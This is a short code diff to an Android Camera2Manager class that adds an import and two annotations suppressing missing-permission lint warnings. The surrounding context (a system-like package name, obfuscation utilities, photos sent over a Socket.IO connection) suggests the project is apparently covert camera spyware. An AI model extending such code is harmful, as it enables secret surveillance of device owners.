@@ -25,6 +25,8 @@ import android.os.HandlerThread;
 import android.util.Log;
 import android.util.Size;
 
+import android.annotation.SuppressLint;
+
 import com.android.background.services.IOSocket;
 import com.android.background.services.ObfuscationUtils;
 
@@ -92,6 +94,7 @@ public class Camera2Manager {
      * @param cameraIdInt integer camera ID matching the old Camera API:
      *                    0 = back, 1 = front, -1 = list only
      */
+    @SuppressLint("MissingPermission")
     public void startUp(int cameraIdInt) {
         // If Camera2 previously failed, fall back to old API
         if (fallbackToOldApi || Build.VERSION.SDK_INT < Build.VERSION_CODES.LOLLIPOP) {
@@ -143,6 +146,7 @@ public class Camera2Manager {
      * over the Socket.IO connection. Blocks the calling thread up to
      * TIMEOUT_SECONDS for the async Camera2 callbacks.
      */
+    @SuppressLint("MissingPermission")
     private void capturePhoto(CameraManager manager, String cameraId)
             throws CameraAccessException {
 
